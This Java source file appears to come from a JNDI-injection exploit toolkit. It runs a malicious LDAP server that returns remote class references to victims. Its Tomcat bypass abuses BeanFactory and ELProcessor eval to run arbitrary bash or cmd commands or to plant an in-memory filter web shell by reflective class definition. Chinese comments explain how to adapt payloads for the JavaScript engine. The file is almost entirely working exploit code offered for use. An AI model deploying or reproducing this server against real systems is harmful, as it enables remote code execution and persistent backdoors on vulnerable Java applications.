/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package jndi;


import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.*;
import core.GenerateMemShell;
import core.utils.Util;
import org.apache.naming.ResourceRef;
import utils.Mapper;

import static jndi.ServerStart.getLocalTime;


/**
 * LDAP jndi implementation returning JNDI references
 *
 * @author mbechler welkin
 */
public class LDAPRefServer implements Runnable {

    private static String payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";
    private static final String LDAP_BASE = "dc=example,dc=com";
    private int port;
    private URL codebase_url;

    private static InMemoryDirectoryServer ds;

    public LDAPRefServer(int port, URL codebase_url) {
        this.port = port;
        this.codebase_url = codebase_url;
    }

    @Override
    public void run() {
//        int port = 1389;

//        try {
//            Class.forName("util.Mapper");
//        }catch (ClassNotFoundException e){
//            e.printStackTrace();
//        }

//        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
//            System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
//            System.exit(-1);
//        }
//        else if ( args.length > 1 ) {
//            port = Integer.parseInt(args[ 1 ]);
//        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(this.codebase_url));
//            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds = new InMemoryDirectoryServer(config);
//            System.out.println(getLocalTime() + " [LDAPSERVER] >> Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void shutdown() {
        ds.shutDown(true);
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see InMemoryOperationInterceptor#processSearchResult(InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            String javaFactory = Mapper.references.get(base);
            try {
                if (javaFactory.contains("Bypass")) {
                    sendResultTomcatByPass(result, base, e);
                } else {
                    sendResult(result, base, e);
                }
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }


        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, IOException {

            String cbstring = this.codebase.toString();
            String javaFactory = Mapper.references.get(base);

            if (javaFactory != null) {
                URL turl = new URL(cbstring + javaFactory.concat(".class"));
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", Util.getRandomString());
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", javaFactory);
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } else {
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Reference that matches the name(" + base + ") is not found.");
            }
        }

        protected void sendResultTomcatByPass(InMemoryInterceptedSearchResult result, String base, Entry e) throws IOException, LDAPException {
            String javaFactory = Mapper.references.get(base);

            if (javaFactory != null) {
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Send LDAP reference result for " + base);
                e.addAttribute("javaClassName", "java.lang.String"); //could be any
                //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));

                String code = "";
                if (javaFactory.contains("MemShell")) {
                    code = TomcatBypassHelper.injectMemshell("TomcatFilterMemShell");
                } else {
                    code = TomcatBypassHelper.getExecCode(JettyServer.command);
                }
                String finalPayload = payloadTemplate.replace("{replacement}", code);
                ref.add(new StringRefAddr("x", finalPayload));
                e.addAttribute("javaSerializedData", Util.serialize(ref));

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } else {
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Reference that matches the name(" + base + ") is not found.");
            }
        }
    }

    private static class TomcatBypassHelper {
        /*
            在对代码进行改写时需要注意：
                ① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )
                ② 必须使用全类名
                ③  System.out.println() 需要修改为 print()
                ④  try{...}catch(Exception e){...}  需要修改为 try{...}catch(err){...}
                ⑤  双引号改为单引号
                ⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等
                ⑦  去除类型强转
                ⑧  不能用 sun.misc.BASE64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: "sun" is not defined in <eval> at line number 1
                ⑨  不能使用  for(Object obj : objects) 循环
         */

        public static String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public static String injectMemshell(String filename) {
            //使用类加载的方式最为方便，可维护性也大大增强

            String classCode = null;
            try {
                classCode = GenerateMemShell.generateMemShell(filename.replace(".class", ""), "BASE64", "7");
            } catch (Exception e) {
                e.printStackTrace();
            }

            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + filename + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }
    }
}
